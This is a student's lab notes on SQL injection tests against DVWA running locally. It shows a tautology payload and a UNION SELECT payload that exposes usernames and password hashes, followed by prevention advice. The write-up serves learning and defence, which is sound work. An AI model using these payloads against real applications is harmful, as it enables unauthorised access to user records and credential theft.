# SQL Injection Testing Notes

## 1. Lab Setup

For this task, I used DVWA (Damn Vulnerable Web Application) on Kali Linux to understand how SQL injection works.

- **Application:** DVWA
- **Operating System:** Kali Linux
- **Security Level:** Low
- **Target:** `127.0.0.1:42001`
- **Module:** SQL Injection

I performed all the tests on my own local machine using DVWA.

## 2. First Test: Basic SQL Injection

**Payload used:**

```sql
1' OR '1'='1' #
```

**Result:**

The application displayed five user records:

- admin
- Gordon Brown
- Hack Me
- Pablo Picasso
- Bob Smith

**What I observed:**

The condition `'1'='1'` is always true. Because of this, the application returned multiple user records instead of showing information for just one ID.

This showed me how an attacker can change the original SQL query by entering specially crafted input.

## 3. Second Test: UNION-Based SQL Injection

**Payload used:**

```sql
1' UNION SELECT user, password FROM users #
```

**Result:**

This time, the application displayed five usernames along with their password hashes:

- admin
- gordonb
- 1337
- pablo
- smithy

**What I observed:**

The `UNION SELECT` statement allowed me to retrieve information from the `users` table through the same input field.

The application displayed usernames and password hashes that should not have been accessible through this form. These values were hashes, not actual plaintext passwords.

## 4. What I Learned About the Security Risk

From these two tests, I understood that SQL injection can be a serious problem when an application does not handle user input properly.

Someone exploiting this weakness could:

- View records that they are not supposed to access.
- Retrieve usernames and password hashes.
- Use the exposed information to attempt further attacks.

## 5. How SQL Injection Can Be Prevented

There are several ways developers can reduce this risk:

- Use prepared statements and parameterized queries.
- Avoid adding user input directly into SQL queries.
- Give database users only the permissions they actually need.
- Check and validate user input.
- Avoid showing detailed database errors on public pages.

## 6. Conclusion

In this task, I successfully performed two SQL injection tests using DVWA with the security level set to Low.

The first test returned multiple user records, while the second exposed usernames and password hashes. This practical exercise helped me understand how SQL injection works and why developers should handle user input carefully.

All testing was performed on my local DVWA installation for learning purposes.
